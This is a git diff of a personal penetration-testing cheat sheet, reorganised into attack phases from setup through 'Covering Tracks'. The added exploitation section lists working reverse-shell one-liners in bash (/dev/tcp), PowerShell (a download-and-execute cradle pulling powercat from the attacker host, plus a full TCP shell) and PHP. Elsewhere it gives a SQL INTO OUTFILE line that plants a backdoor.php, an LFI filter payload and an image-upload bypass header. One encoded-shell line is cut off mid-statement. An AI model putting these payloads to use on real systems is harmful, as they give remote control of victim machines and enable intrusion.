@@ -1,10 +1,12 @@
 # Common Commands
 
-My Common commands list, basically Commands I use alot, so would like to have stored and organized for quick usage. 
+#### My Common commands list, basically Commands I use alot, so would like to have stored and organized for quick usage. 
+#### I try to keep them them in order of Phase, and further by usage, to help with methodology. 
 
-Tried to put them in order of usage, to help with methodology. 
+<sub>Note: This is an ever evolving list, and is subject to frequent changes</sub>
 
 ---
+# Setup / Miscellaneous
 
 <details><summary>Export Variables:</summary>
 
@@ -37,7 +39,7 @@ export LH=$(ip addr show | awk '/inet.*tun0/ {print $2}' | cut -d '/' -f 1)
 
 #### Attack Box Port:
 ```
-export LP=""
+export LPORT="443"
 ```
 <sub>Note: Local Port To catch reverse shells.</sub>
 
@@ -51,6 +53,43 @@ echo "$IP $URL" | sudo tee -a /etc/hosts > /dev/null
 ```
 
 </details>
+
+<details><summary>File Manipulation:</summary>
+
+#### Extract IPs from a text file:  
+```
+grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
+```
+
+</details>
+
+<details><summary>Miscellanous:</summary>
+
+### Command Execution Verification - [Ping check]
+```
+tcpdump -i any -c5 icmp
+```
+### Check Network
+```
+netdiscover /r 0.0.0.0/24
+```
+#### INTO OUTFILE D00R
+```
+SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
+```
+#### LFI?:
+PHP Filter Checks:
+```
+php://filter/convert.base64-encode/resource=
+```
+#### UPLOAD IMAGE?:
+```
+GIF89a1
+```
+</details>
+
+# Enumeration:
+
 <details><summary>Nmap:</summary>
 
 #### Basic:
@@ -219,36 +258,42 @@ smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.
 smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
 ```
 </details>
-<details><summary>File Manipulation:</summary>
 
-#### Extract IPs from a text file:  
+# Exploitation:
+
+<details><summary>Revshells:</summary>
+
+#### Bash: 
 ```
-grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
+bash -c "bash -i >& /dev/tcp/$IP/$LPORT 0>&1"
+```
+#### Bash Encoded: 
+```
+echo -n "bash -c \"bash -i >& /dev/tcp/$IP/$LPORT 0>&1\"" | python3 -c 'import sys, urllib.parse; print(
+```
+<sub>Note: Will Print Encoded Version</sub>
+
+#### Powershell (Powercat): 
+
+```
+echo "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$LH/powercat.ps1');powercat -c $IP -p $LPORT -e cmd\""
+```
+<sub>Note: Will Print the payload to run on victim machine</sub>
+
+#### Powershell (1 Liner):
+```
+$Text = "\$client = New-Object System.Net.Sockets.TCPClient(\"$IP\", $LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+<sub>Note: Be sure to change $IP and $LPORT </sub>
+```
+
+#### PHP 1 Liner: 
+```
+php -r '$sock=fsockopen("$LH", $LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 </details>
-<details><summary>Miscellanous:</summary>
 
-### Command Execution Verification - [Ping check]
-```
-tcpdump -i any -c5 icmp
-```
-### Check Network
-```
-netdiscover /r 0.0.0.0/24
-```
-#### INTO OUTFILE D00R
-```
-SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
-```
-#### LFI?:
-PHP Filter Checks:
-```
-php://filter/convert.base64-encode/resource=
-```
-#### UPLOAD IMAGE?:
-```
-GIF89a1
-```
-</details>
+# Post-Exploitation:
 
+
+# Covering Tracks: 
